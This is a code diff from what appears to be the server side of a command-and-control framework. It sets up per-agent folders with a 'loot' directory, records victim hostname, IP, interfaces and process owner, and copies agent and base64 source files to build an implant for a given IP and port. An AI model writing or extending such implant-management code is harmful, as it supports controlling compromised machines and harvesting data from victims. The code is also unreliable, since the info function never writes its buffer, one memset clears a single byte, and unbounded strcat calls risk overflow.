@@ -2,26 +2,82 @@
 #include "misc.h"
 #include "authenticate.h"
 
-void init_agent(char *agent_id){
+void agent_write_info(char *id, char *connection_time,
+     char *hostname, char *ip_addr, char *interfaces, char *proc_owner){
+    
+    char buff[BUFSIZ];
     FILE *fd = NULL;
-    char buff[2048];
-    char buff2[2048];
     memset(buff, 0, sizeof(buff));
-    memset(buff2, 0, sizeof(buff2));
-    strcat(buff, "agents/");
-    strcat(buff, agent_id); //agents/TEST-AGENT
-    strcpy(buff2, buff);
-    mkdir(buff, 0755);
-    mkdir(strcat(buff, "/loot"), 0755);
+    sprintf(buff, "agents/%s/info.txt", id);
+    fd = fopen(buff, "w");
+    if(fd == NULL){
+        perror("");
+        return;
+    }
+    memset(buff, 0, sizeof(buff));
+    if(id != NULL){
+        strcat(buff, id);
+    } else {
+        strcat(buff, "NA");
+    }
+    strcat(buff, "\n");
 
-    fd = fopen(strcat(buff2, "/agent.mfst"), "w");
-    char data[512];
+    if(connection_time != NULL){
+        strcat(buff, connection_time);
+    } else {
+        strcat(buff, "NA");
+    }
+    strcat(buff, "\n");
 
-    fwrite("default", 1, sizeof("default"), fd);
+    if(hostname != NULL){
+        strcat(buff, hostname);
+    } else {
+        strcat(buff, "NA");
+    }
+    strcat(buff, "\n");
 
+    if(ip_addr != NULL){
+        strcat(buff, ip_addr);
+    } else {
+        strcat(buff, "NA");
+    }
+    strcat(buff, "\n");
 
-    fwrite(data, 1, strlen(data), fd);
+    if(interfaces != NULL){
+        strcat(buff, interfaces);
+    } else {
+        strcat(buff, "NA");
+    }
+    strcat(buff, "\n");
+
+    if(proc_owner != NULL){
+        strcat(buff, proc_owner);
+    } else {
+        strcat(buff, "NA");
+    }
+    strcat(buff, "\n");
+
     fclose(fd);
+
+
+}
+
+void init_agent(char *agent_id){
+    FILE *manifest = NULL;
+    char parent_dir[2048];
+    char *buff;
+    memset(parent_dir, 0, sizeof(parent_dir));
+    sprintf(parent_dir, "agents/%s", agent_id);
+    buff = strdup(parent_dir);
+    mkdir(parent_dir, 0755);
+    mkdir(strcat(parent_dir, "/loot"), 0755);
+
+    manifest = fopen(strcat(buff, "/agent.mfst"), "w");
+    fwrite("NULL :)", 1, sizeof("NULL :)"), manifest);
+    fclose(manifest);
+    agent_write_info(agent_id, NULL, NULL, NULL, NULL, NULL);
+
+    
 }
 
 void write_format(char *path){
@@ -115,6 +171,16 @@ void compile_agent(char *ip, char *port){
     strcat(buff, AGENT_SOURCE);
     strcat(buff, "agent.c");
     copy_file(buff, "out/agent.c");
+
+    memset(buff, 0, sizeof(*buff));
+    strcat(buff, AGENT_SOURCE);
+    strcat(buff, "b64.h");
+    copy_file(buff, "out/b64.h");
+
+    memset(buff, 0, sizeof(*buff));
+    strcat(buff, AGENT_SOURCE);
+    strcat(buff, "b64.c");
+    copy_file(buff, "out/b64.c");
 
     memset(buff, 0, sizeof(buff));
     strcat(buff, AGENT_SOURCE);
